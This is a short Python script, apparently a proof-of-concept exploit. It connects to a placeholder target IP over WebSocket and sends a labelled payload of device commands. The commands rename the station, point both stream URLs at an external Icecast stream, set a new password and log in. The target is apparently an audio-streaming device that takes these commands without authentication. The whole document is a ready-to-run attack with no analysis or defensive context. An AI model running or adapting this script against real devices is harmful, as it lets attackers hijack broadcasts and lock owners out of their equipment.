import websocket

# Target WebSocket URL
ws_url = "ws://<target-ip>/"

# Commands to send
payload = """
SendLog
RouteMeta true
SetName Radio_Fiemme_Paganella
SetUrl1 https://stream3.xdevel.com/audio6s975355-281/stream/icecast.audio5
SetUrl2 https://stream3.xdevel.com/audio6s975355-281/stream/icecast.audio5
SetPwd adt
Login adt
"""

# Establish WebSocket connection
ws = websocket.create_connection(ws_url)

# Send payload
ws.send(payload)

# Receive response (if any)
response = ws.recv()
print(f"Response: {response}")

# Close connection
ws.close()
